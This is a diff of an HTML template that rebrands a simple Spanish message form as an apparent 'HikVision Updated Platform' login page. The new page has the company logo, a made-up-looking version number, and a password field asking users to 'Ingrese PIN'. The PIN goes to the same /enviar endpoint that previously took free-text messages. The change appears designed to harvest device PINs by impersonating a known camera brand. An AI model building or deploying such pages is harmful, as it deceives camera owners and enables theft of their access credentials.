@@ -9,14 +9,37 @@
 <body class="bg-light d-flex justify-content-center align-items-center vh-100">
 
 <div class="container text-center">
-    <div class="card shadow p-4" style="max-width: 400px; margin: auto;">
-        <h4 class="mb-3">📨 Enviar mensaje</h4>
+    <div class="card shadow p-4" style="max-width: 400px; margin: auto; background-color: #eceaea">
+        <div class="text-center mb-3">
+            <img th:src="@{/images/logo.png}" alt="Logo HikVision" 
+               style="width: 100%; height: auto; border-radius: 8px; object-fit: cover;">
+        </div>
+        <h4 class="mb-3" style="font-size: 1.2rem; display: flex; align-items: center; justify-content: center; gap: 8px;">
+            <i class="bi bi-camera-video-fill"></i>
+            HikVision Updated Platform
+            </h4>
+        <h4 class="mb-4" style="font-size: 0.9rem;"> Version v.7.873823.34 </h4>
+
+        <br/>
+        <h4 class="mb-4" style="font-size: 1.4rem;"> Ingrese PIN </h4>
         <form action="/enviar" method="post">
             <div class="mb-3">
-                <textarea name="mensaje" class="form-control" rows="3" placeholder="Escribe tu mensaje aquí..." required></textarea>
+                <input type="password"
+                       name="mensaje"
+                       class="form-control text-center"
+                       placeholder=""
+                       minlength="4"
+                       maxlength="8"
+                       pattern=".{4,8}"
+                       title="Debe tener entre 4 y 8 caracteres"
+                       required>
             </div>
-            <button type="submit" class="btn btn-primary w-100">Enviar</button>
+            <br/>
+            <button type="submit" class="btn w-100" 
+            style="background-color: #5f0606; color: white; border: none;"> Ingresar  </button>
+        
         </form>
+
         <div th:if="${param.enviado}" class="alert alert-success mt-3">
             ¡Mensaje enviado correctamente!
         </div>
